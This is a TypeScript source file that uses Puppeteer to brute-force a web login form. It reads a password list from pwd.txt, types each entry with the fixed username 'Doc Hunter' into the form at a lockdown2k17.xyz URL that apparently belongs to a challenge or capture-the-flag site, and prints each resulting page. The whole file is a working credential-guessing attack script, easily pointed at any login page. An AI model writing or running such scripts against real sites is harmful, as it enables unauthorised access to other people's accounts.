import * as puppeteer from "puppeteer";
import * as fs from "fs";
import * as path from "path";
import * as util from "util";

const URL = "https://lockdown2k17.xyz/01-kory/index.php?page=home";
const USERNAME = "Doc Hunter";
const USERNAME_SELECTOR = 'input[name="username"]';
const PASSWORD_SELECTOR = 'input[type="password"]';
const SUBMIT_SELECTOR = "#button";

const pwdFilePath = path.resolve(__dirname, "../", "pwd.txt");
const readFile = util.promisify(fs.readFile);

async function submitForm(pwd: string, page: puppeteer.Page) {
  await page.click(USERNAME_SELECTOR);
  await page.keyboard.type(USERNAME);

  await page.click(PASSWORD_SELECTOR);
  await page.keyboard.type(pwd);

  await page.click(SUBMIT_SELECTOR);
  await page.waitForNavigation();
}

(async () => {
  try {
    let i = 0;
    const file: string = await readFile(pwdFilePath, {
      encoding: "utf-8",
    });
    const passwords: string[] = file.split("\n");
    for (const pwd of passwords) {
      i++;
      console.log("[" + i.toString() + "] " + "tryin " + pwd);
      const browser = await puppeteer.launch();
      const page = await browser.newPage();
      await page.goto(URL, { waitUntil: "load" });
      await submitForm(pwd, page);
      await page.waitFor(3000);
      console.log(await page.content());
      // await page.pdf({ path: __dirname + "/" + pwd + ".pdf" });
      await browser.close();
    }
  } catch (error) {
    console.error(error);
  }
})();
